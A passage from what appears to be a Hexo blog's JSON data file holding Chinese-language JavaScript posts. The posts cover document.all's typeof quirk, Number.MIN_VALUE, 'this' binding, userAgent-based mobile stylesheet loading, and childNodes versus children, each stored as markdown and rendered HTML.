undefined</h2><p><strong>⚠️这个是前端浏览器API，在Nodejs环境无法使用。</strong></p>\n<p>尽管<code>document.all</code>可以返回一个像<code>数组一样的对象</code>，可以用来<code>访问DOM节点</code>。但是呢，通过<code>typeof</code>查看<code>document.all</code>，你会惊讶地发现类型是<code>undefined</code>。</p>\n<pre><code>document.all instanceof Object // -&gt; true\ntypeof document.all // -&gt; &apos;undefined&apos;\n</code></pre><p>而且，<code>document.all</code>并不等于<code>undefined</code>。</p>\n<pre><code>document.all === undefined // -&gt; false\ndocument.all === null // -&gt; false\n</code></pre><p>而且，更惊讶的是：</p>\n<pre><code>document.all == null // -&gt; true\n</code></pre><p><code>document.all</code>是一个过去常用的<code>获取DOM元素</code>的方法，特别是老版本的IE。但是<code>从未进入标准</code>，尽管广泛使用在过去的JS代码中。当<code>新的API</code>突出来(比如<code>document.getElementById</code>)后，<code>document.all</code>就被<code>淘汰</code>了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了<code>JavaScript</code>的规范。</p>\n<h2 id=\"最小值比0还大\"><a href=\"#最小值比0还大\" class=\"headerlink\" title=\"最小值比0还大\"></a>最小值比0还大</h2><p><code>Number.MIN_VALUE</code>是最小的数，但是它比<code>0</code>还大。</p>\n<pre><code>Number.MIN_VALUE &gt; 0 // -&gt; true\n</code></pre><p>因为<code>Number.MIN_VALUE</code>是<code>5e-324</code>。也就是说即使<code>最小的值</code>也可以用<code>浮点数</code>表示出来，虽然<code>离0很接近</code>，但是<code>依然比0大</code>。其实最小的数是<code>Number.NEGATIVE_INFINITY</code>，尽管它<code>不是一个实际存在</code>的数。</p>\n"},{"title":"深入理解JS中this","date":"2018-06-12T06:34:52.000Z","_content":"# [转]深入理解javascript之this\n  (2018年2月28日 16:38:18)\n\n  javascript中的`this`含义非常丰富,它可以是`全局对象`,`当前对象`或者是`任意对象`,这都`取决于`**函数的调用方式**。\n  函数有`以下几种`调用方式：`作为对象方法调用`、`作为函数调用`、`作为构造函数调用`、`apply`或`call`调用。\n\n  + **对象方法调用**  \n   作为`对象方法`调用的时候,`this`会被`绑定到该对象`。\n   例：略\n\n  + **强调**:  \n   `this`是在函数`执行时`去获取对应的值,而不是函数`定义时`。即使是`对象方法`调用,如果该方法的`函数属性`以`函数名的形式`传入`其他作用域`,也会`改变this`的指向。我举一个例子：\n\n  + **函数调用**  \n   函数也可以`直接被调用`,这个时候`this`被`绑定到了全局对象`。\n\n  + **构造函数调用**  \n   在javascript中自己创建`构造函数`时可以`利用this`来指向新创建的对象上。这样就可以避免函数中的this指向全局了。\n  \n  + **apply或call调用**  \n   这两个方法可以`切换`函数执行的`上下文环境`,也就是`改变this绑定的对象`。apply和call比较类似,区别在于传入参数时一个要求是数组,一个要求是分开传入。所以我们以apply为例：\n  \n  + **箭头函数调用**  \n   `补充`:ES6中 `箭头函数`的`this始终指向函数定义时的this, 而非执行时`。  \n   我们通过一个例子来理解:  \n   还需要**注意**一点的就是这个`this不会改变指向对象`,我们知道`call`和`apply`可以改变`this`的指向,但是在`箭头函数中无效`的。\n  \n  + **箭头函数的特性**  \n   箭头函数内部没有`constructor`方法,也没有`prototype`,所以不支持`new`操作。但是它对`this`的处理与一般的普通函数不一样。箭头函数的`this`始终指向函数`定义时`的 `this`,而非执行时。我们通过一个例子来理解:\n\n---\n[阅读原文](http://blog.csdn.net/mevicky/article/details/46659273)\n","source":"_posts/FrontEnd/JS/深入理解JS中this.md","raw":"---\ntitle: 深入理解JS中this\ndate: 2018-06-12 14:34:52\ntags: JS-this\ncategories: JavaScript\n---\n# [转]深入理解javascript之this\n  (2018年2月28日 16:38:18)\n\n  javascript中的`this`含义非常丰富,它可以是`全局对象`,`当前对象`或者是`任意对象`,这都`取决于`**函数的调用方式**。\n  函数有`以下几种`调用方式：`作为对象方法调用`、`作为函数调用`、`作为构造函数调用`、`apply`或`call`调用。\n\n  + **对象方法调用**  \n   作为`对象方法`调用的时候,`this`会被`绑定到该对象`。\n   例：略\n\n  + **强调**:  \n   `this`是在函数`执行时`去获取对应的值,而不是函数`定义时`。即使是`对象方法`调用,如果该方法的`函数属性`以`函数名的形式`传入`其他作用域`,也会`改变this`的指向。我举一个例子：\n\n  + **函数调用**  \n   函数也可以`直接被调用`,这个时候`this`被`绑定到了全局对象`。\n\n  + **构造函数调用**  \n   在javascript中自己创建`构造函数`时可以`利用this`来指向新创建的对象上。这样就可以避免函数中的this指向全局了。\n  \n  + **apply或call调用**  \n   这两个方法可以`切换`函数执行的`上下文环境`,也就是`改变this绑定的对象`。apply和call比较类似,区别在于传入参数时一个要求是数组,一个要求是分开传入。所以我们以apply为例：\n  \n  + **箭头函数调用**  \n   `补充`:ES6中 `箭头函数`的`this始终指向函数定义时的this, 而非执行时`。  \n   我们通过一个例子来理解:  \n   还需要**注意**一点的就是这个`this不会改变指向对象`,我们知道`call`和`apply`可以改变`this`的指向,但是在`箭头函数中无效`的。\n  \n  + **箭头函数的特性**  \n   箭头函数内部没有`constructor`方法,也没有`prototype`,所以不支持`new`操作。但是它对`this`的处理与一般的普通函数不一样。箭头函数的`this`始终指向函数`定义时`的 `this`,而非执行时。我们通过一个例子来理解:\n\n---\n[阅读原文](http://blog.csdn.net/mevicky/article/details/46659273)\n","slug":"FrontEnd/JS/深入理解JS中this","published":1,"updated":"2018-06-12T06:41:31.046Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cv007ab8xjegypn0fa","content":"<h1 id=\"转-深入理解javascript之this\"><a href=\"#转-深入理解javascript之this\" class=\"headerlink\" title=\"[转]深入理解javascript之this\"></a>[转]深入理解javascript之this</h1><p>  (2018年2月28日 16:38:18)</p>\n<p>  javascript中的<code>this</code>含义非常丰富,它可以是<code>全局对象</code>,<code>当前对象</code>或者是<code>任意对象</code>,这都<code>取决于</code><strong>函数的调用方式</strong>。<br>  函数有<code>以下几种</code>调用方式：<code>作为对象方法调用</code>、<code>作为函数调用</code>、<code>作为构造函数调用</code>、<code>apply</code>或<code>call</code>调用。</p>\n<ul>\n<li><p><strong>对象方法调用</strong><br>作为<code>对象方法</code>调用的时候,<code>this</code>会被<code>绑定到该对象</code>。<br>例：略</p>\n</li>\n<li><p><strong>强调</strong>:<br><code>this</code>是在函数<code>执行时</code>去获取对应的值,而不是函数<code>定义时</code>。即使是<code>对象方法</code>调用,如果该方法的<code>函数属性</code>以<code>函数名的形式</code>传入<code>其他作用域</code>,也会<code>改变this</code>的指向。我举一个例子：</p>\n</li>\n<li><p><strong>函数调用</strong><br>函数也可以<code>直接被调用</code>,这个时候<code>this</code>被<code>绑定到了全局对象</code>。</p>\n</li>\n<li><p><strong>构造函数调用</strong><br>在javascript中自己创建<code>构造函数</code>时可以<code>利用this</code>来指向新创建的对象上。这样就可以避免函数中的this指向全局了。</p>\n</li>\n<li><p><strong>apply或call调用</strong><br>这两个方法可以<code>切换</code>函数执行的<code>上下文环境</code>,也就是<code>改变this绑定的对象</code>。apply和call比较类似,区别在于传入参数时一个要求是数组,一个要求是分开传入。所以我们以apply为例：</p>\n</li>\n<li><p><strong>箭头函数调用</strong><br><code>补充</code>:ES6中 <code>箭头函数</code>的<code>this始终指向函数定义时的this, 而非执行时</code>。<br>我们通过一个例子来理解:<br>还需要<strong>注意</strong>一点的就是这个<code>this不会改变指向对象</code>,我们知道<code>call</code>和<code>apply</code>可以改变<code>this</code>的指向,但是在<code>箭头函数中无效</code>的。</p>\n</li>\n<li><p><strong>箭头函数的特性</strong><br>箭头函数内部没有<code>constructor</code>方法,也没有<code>prototype</code>,所以不支持<code>new</code>操作。但是它对<code>this</code>的处理与一般的普通函数不一样。箭头函数的<code>this</code>始终指向函数<code>定义时</code>的 <code>this</code>,而非执行时。我们通过一个例子来理解:</p>\n</li>\n</ul>\n<hr>\n<p><a href=\"http://blog.csdn.net/mevicky/article/details/46659273\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"转-深入理解javascript之this\"><a href=\"#转-深入理解javascript之this\" class=\"headerlink\" title=\"[转]深入理解javascript之this\"></a>[转]深入理解javascript之this</h1><p>  (2018年2月28日 16:38:18)</p>\n<p>  javascript中的<code>this</code>含义非常丰富,它可以是<code>全局对象</code>,<code>当前对象</code>或者是<code>任意对象</code>,这都<code>取决于</code><strong>函数的调用方式</strong>。<br>  函数有<code>以下几种</code>调用方式：<code>作为对象方法调用</code>、<code>作为函数调用</code>、<code>作为构造函数调用</code>、<code>apply</code>或<code>call</code>调用。</p>\n<ul>\n<li><p><strong>对象方法调用</strong><br>作为<code>对象方法</code>调用的时候,<code>this</code>会被<code>绑定到该对象</code>。<br>例：略</p>\n</li>\n<li><p><strong>强调</strong>:<br><code>this</code>是在函数<code>执行时</code>去获取对应的值,而不是函数<code>定义时</code>。即使是<code>对象方法</code>调用,如果该方法的<code>函数属性</code>以<code>函数名的形式</code>传入<code>其他作用域</code>,也会<code>改变this</code>的指向。我举一个例子：</p>\n</li>\n<li><p><strong>函数调用</strong><br>函数也可以<code>直接被调用</code>,这个时候<code>this</code>被<code>绑定到了全局对象</code>。</p>\n</li>\n<li><p><strong>构造函数调用</strong><br>在javascript中自己创建<code>构造函数</code>时可以<code>利用this</code>来指向新创建的对象上。这样就可以避免函数中的this指向全局了。</p>\n</li>\n<li><p><strong>apply或call调用</strong><br>这两个方法可以<code>切换</code>函数执行的<code>上下文环境</code>,也就是<code>改变this绑定的对象</code>。apply和call比较类似,区别在于传入参数时一个要求是数组,一个要求是分开传入。所以我们以apply为例：</p>\n</li>\n<li><p><strong>箭头函数调用</strong><br><code>补充</code>:ES6中 <code>箭头函数</code>的<code>this始终指向函数定义时的this, 而非执行时</code>。<br>我们通过一个例子来理解:<br>还需要<strong>注意</strong>一点的就是这个<code>this不会改变指向对象</code>,我们知道<code>call</code>和<code>apply</code>可以改变<code>this</code>的指向,但是在<code>箭头函数中无效</code>的。</p>\n</li>\n<li><p><strong>箭头函数的特性</strong><br>箭头函数内部没有<code>constructor</code>方法,也没有<code>prototype</code>,所以不支持<code>new</code>操作。但是它对<code>this</code>的处理与一般的普通函数不一样。箭头函数的<code>this</code>始终指向函数<code>定义时</code>的 <code>this</code>,而非执行时。我们通过一个例子来理解:</p>\n</li>\n</ul>\n<hr>\n<p><a href=\"http://blog.csdn.net/mevicky/article/details/46659273\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"移动检测","date":"2018-05-12T01:53:48.000Z","_content":"## [转]检测 移动端/PC端 加载不同样式表现\n\n第一种方式：\n````\nif (/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))) {\n  if (window.location.href.indexOf(\"?mobile\") < 0) {\n    try {\n      if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {\n        //window.location.href = \"手机页面\";\n        console.log('手机页面')\n      } else if (/iPad/i.test(navigator.userAgent)) {\n        //window.location.href = \"平板页面\";\n        console.log('平板页面')\n      } else {\n        //window.location.href = \"其他移动端页面\"\n        console.log('其他移动端页面')\n      }\n    } catch (e) {\n      console.log('e:', e);\n    }\n  }\n} else {\n  console.log('PC页面');\n}\n````\n\n第二种方式：\n````\n<script type=\"text/javascript\">\n  // 判断是否为移动端运行环境 \n  if (/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (\n      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/\n      .test(navigator.userAgent))) {\n    if (window.location.href.indexOf(\"?mobile\") < 0) {\n      try {\n        if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {\n          // 判断访问环境是 Android|webOS|iPhone|iPod|BlackBerry 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_a.css\");\n        } else if (/iPad/i.test(navigator.userAgent)) {\n          // 判断访问环境是 iPad 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_iPad.css\");\n        } else {\n          // 判断访问环境是 其他移动设备 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_other.css\");\n        }\n      } catch (e) {}\n    }\n  } else {\n    // 如果以上都不是，则加载以下样式 \n    setActiveStyleSheet(\"style_mobile_no.css\");\n  }\n\n  // 判断完毕后加载样式 \n  function setActiveStyleSheet(filename) {\n    document.write(\"<link href=\" + filename + \" rel=stylesheet>\");\n  }\n</script>\n````\n\n----------\n#### [阅读原文](https://www.cnblogs.com/yuqingfamily/p/8807978.html)","source":"_posts/FrontEnd/JS/移动检测.md","raw":"---\ntitle: 移动检测\ndate: 2018-05-12 09:53:48\ntags: If Mobile\ncategories: JS\n---\n## [转]检测 移动端/PC端 加载不同样式表现\n\n第一种方式：\n````\nif (/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))) {\n  if (window.location.href.indexOf(\"?mobile\") < 0) {\n    try {\n      if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {\n        //window.location.href = \"手机页面\";\n        console.log('手机页面')\n      } else if (/iPad/i.test(navigator.userAgent)) {\n        //window.location.href = \"平板页面\";\n        console.log('平板页面')\n      } else {\n        //window.location.href = \"其他移动端页面\"\n        console.log('其他移动端页面')\n      }\n    } catch (e) {\n      console.log('e:', e);\n    }\n  }\n} else {\n  console.log('PC页面');\n}\n````\n\n第二种方式：\n````\n<script type=\"text/javascript\">\n  // 判断是否为移动端运行环境 \n  if (/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (\n      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/\n      .test(navigator.userAgent))) {\n    if (window.location.href.indexOf(\"?mobile\") < 0) {\n      try {\n        if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {\n          // 判断访问环境是 Android|webOS|iPhone|iPod|BlackBerry 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_a.css\");\n        } else if (/iPad/i.test(navigator.userAgent)) {\n          // 判断访问环境是 iPad 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_iPad.css\");\n        } else {\n          // 判断访问环境是 其他移动设备 则加载以下样式 \n          setActiveStyleSheet(\"style_mobile_other.css\");\n        }\n      } catch (e) {}\n    }\n  } else {\n    // 如果以上都不是，则加载以下样式 \n    setActiveStyleSheet(\"style_mobile_no.css\");\n  }\n\n  // 判断完毕后加载样式 \n  function setActiveStyleSheet(filename) {\n    document.write(\"<link href=\" + filename + \" rel=stylesheet>\");\n  }\n</script>\n````\n\n----------\n#### [阅读原文](https://www.cnblogs.com/yuqingfamily/p/8807978.html)","slug":"FrontEnd/JS/移动检测","published":1,"updated":"2018-05-12T02:51:16.498Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cw007eb8xjh4okpg1q","content":"<h2 id=\"转-检测-移动端-PC端-加载不同样式表现\"><a href=\"#转-检测-移动端-PC端-加载不同样式表现\" class=\"headerlink\" title=\"[转]检测 移动端/PC端 加载不同样式表现\"></a>[转]检测 移动端/PC端 加载不同样式表现</h2><p>第一种方式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))) &#123;</span><br><span class=\"line\">  if (window.location.href.indexOf(&quot;?mobile&quot;) &lt; 0) &#123;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">      if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">        //window.location.href = &quot;手机页面&quot;;</span><br><span class=\"line\">        console.log(&apos;手机页面&apos;)</span><br><span class=\"line\">      &#125; else if (/iPad/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">        //window.location.href = &quot;平板页面&quot;;</span><br><span class=\"line\">        console.log(&apos;平板页面&apos;)</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        //window.location.href = &quot;其他移动端页面&quot;</span><br><span class=\"line\">        console.log(&apos;其他移动端页面&apos;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; catch (e) &#123;</span><br><span class=\"line\">      console.log(&apos;e:&apos;, e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  console.log(&apos;PC页面&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>第二种方式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">  // 判断是否为移动端运行环境 </span><br><span class=\"line\">  if (/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (</span><br><span class=\"line\">      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/</span><br><span class=\"line\">      .test(navigator.userAgent))) &#123;</span><br><span class=\"line\">    if (window.location.href.indexOf(&quot;?mobile&quot;) &lt; 0) &#123;</span><br><span class=\"line\">      try &#123;</span><br><span class=\"line\">        if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">          // 判断访问环境是 Android|webOS|iPhone|iPod|BlackBerry 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_a.css&quot;);</span><br><span class=\"line\">        &#125; else if (/iPad/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">          // 判断访问环境是 iPad 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_iPad.css&quot;);</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">          // 判断访问环境是 其他移动设备 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_other.css&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; catch (e) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    // 如果以上都不是，则加载以下样式 </span><br><span class=\"line\">    setActiveStyleSheet(&quot;style_mobile_no.css&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 判断完毕后加载样式 </span><br><span class=\"line\">  function setActiveStyleSheet(filename) &#123;</span><br><span class=\"line\">    document.write(&quot;&lt;link href=&quot; + filename + &quot; rel=stylesheet&gt;&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h4 id=\"阅读原文\"><a href=\"#阅读原文\" class=\"headerlink\" title=\"阅读原文\"></a><a href=\"https://www.cnblogs.com/yuqingfamily/p/8807978.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></h4>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-检测-移动端-PC端-加载不同样式表现\"><a href=\"#转-检测-移动端-PC端-加载不同样式表现\" class=\"headerlink\" title=\"[转]检测 移动端/PC端 加载不同样式表现\"></a>[转]检测 移动端/PC端 加载不同样式表现</h2><p>第一种方式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (/AppleWebKit.*mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))) &#123;</span><br><span class=\"line\">  if (window.location.href.indexOf(&quot;?mobile&quot;) &lt; 0) &#123;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">      if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">        //window.location.href = &quot;手机页面&quot;;</span><br><span class=\"line\">        console.log(&apos;手机页面&apos;)</span><br><span class=\"line\">      &#125; else if (/iPad/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">        //window.location.href = &quot;平板页面&quot;;</span><br><span class=\"line\">        console.log(&apos;平板页面&apos;)</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        //window.location.href = &quot;其他移动端页面&quot;</span><br><span class=\"line\">        console.log(&apos;其他移动端页面&apos;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; catch (e) &#123;</span><br><span class=\"line\">      console.log(&apos;e:&apos;, e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  console.log(&apos;PC页面&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>第二种方式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">  // 判断是否为移动端运行环境 </span><br><span class=\"line\">  if (/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (</span><br><span class=\"line\">      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/</span><br><span class=\"line\">      .test(navigator.userAgent))) &#123;</span><br><span class=\"line\">    if (window.location.href.indexOf(&quot;?mobile&quot;) &lt; 0) &#123;</span><br><span class=\"line\">      try &#123;</span><br><span class=\"line\">        if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">          // 判断访问环境是 Android|webOS|iPhone|iPod|BlackBerry 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_a.css&quot;);</span><br><span class=\"line\">        &#125; else if (/iPad/i.test(navigator.userAgent)) &#123;</span><br><span class=\"line\">          // 判断访问环境是 iPad 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_iPad.css&quot;);</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">          // 判断访问环境是 其他移动设备 则加载以下样式 </span><br><span class=\"line\">          setActiveStyleSheet(&quot;style_mobile_other.css&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; catch (e) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    // 如果以上都不是，则加载以下样式 </span><br><span class=\"line\">    setActiveStyleSheet(&quot;style_mobile_no.css&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 判断完毕后加载样式 </span><br><span class=\"line\">  function setActiveStyleSheet(filename) &#123;</span><br><span class=\"line\">    document.write(&quot;&lt;link href=&quot; + filename + &quot; rel=stylesheet&gt;&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h4 id=\"阅读原文\"><a href=\"#阅读原文\" class=\"headerlink\" title=\"阅读原文\"></a><a href=\"https://www.cnblogs.com/yuqingfamily/p/8807978.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></h4>"},{"title":"遍历DOM","date":"2018-05-23T07:10:48.000Z","_content":"## 遍历dom节点\n\n### `childNodes` 和 `children` 区别\n\n````\n  <!-- 这部分为获取元素系列操作重点在 `childNodes` `children` -->\n  // let ddHight = document.getElementsByClassName('showdd')[0];\n  // let dCh1 = ddHight.childNodes;\n  // let dCh2 = ddHight.children;\n````\n------\n\n[阅读原文](https://www.baidu.com/s?wd=遍历dom节点&rsv_spt=1&rsv_iqid=0xaf4a3db3000138a2&issp=1&f=3&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=98012088_4_dg&ch=1&rsv_enter=1&oq=%25E5%25A6%2582%25E4%25BD%2595%25E9%2581%258D%25E5%258E%2586element%25E8%258A%2582%25E7%2582%25B9&rsv_t=6622C4udbYHMy%2Fz88Zn2YEqLcdlbOvZsVIngnU74KJya5W8v7BGUVZMdfejA1X93%2Fo2xXg&inputT=4844&rsv_pq=a5934c810006a2c1&rsv_sug3=50&rsv_sug1=40&rsv_sug7=100&rsv_sug2=0&prefixsug=%25E9%2581%258D%25E5%258E%2586dom&rsp=1&rsv_sug4=4844)","source":"_posts/FrontEnd/JS/遍历DOM.md","raw":"---\ntitle: 遍历DOM\ndate: 2018-05-23 15:10:48\ntags: 遍历DOM\ncategories: JS-DOM\n---\n## 遍历dom节点\n\n### `childNodes` 和 `children` 区别\n\n````\n  <!-- 这部分为获取元素系列操作重点在 `childNodes` `children` -->\n  // let ddHight = document.getElementsByClassName('showdd')[0];\n  // let dCh1 = ddHight.childNodes;\n  // let dCh2 = ddHight.children;\n````\n------\n\n[阅读原文](https://www.baidu.com/s?wd=遍历dom节点&rsv_spt=1&rsv_iqid=0xaf4a3db3000138a2&issp=1&f=3&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=98012088_4_dg&ch=1&rsv_enter=1&oq=%25E5%25A6%2582%25E4%25BD%2595%25E9%2581%258D%25E5%258E%2586element%25E8%258A%2582%25E7%2582%25B9&rsv_t=6622C4udbYHMy%2Fz88Zn2YEqLcdlbOvZsVIngnU74KJya5W8v7BGUVZMdfejA1X93%2Fo2xXg&inputT=4844&rsv_pq=a5934c810006a2c1&rsv_sug3=50&rsv_sug1=40&rsv_sug7=100&rsv_sug2=0&prefixsug=%25E9%2581%258D%25E5%258E%2586dom&rsp=1&rsv_sug4=4844)","slug":"FrontEnd/JS/遍历DOM","published":1,"updated":"2018-05-24T03:08:03.500Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cz007hb8xjdyqb6erc","content":"<h2 id=\"遍历dom节点\"><a href=\"#遍历dom节点\" 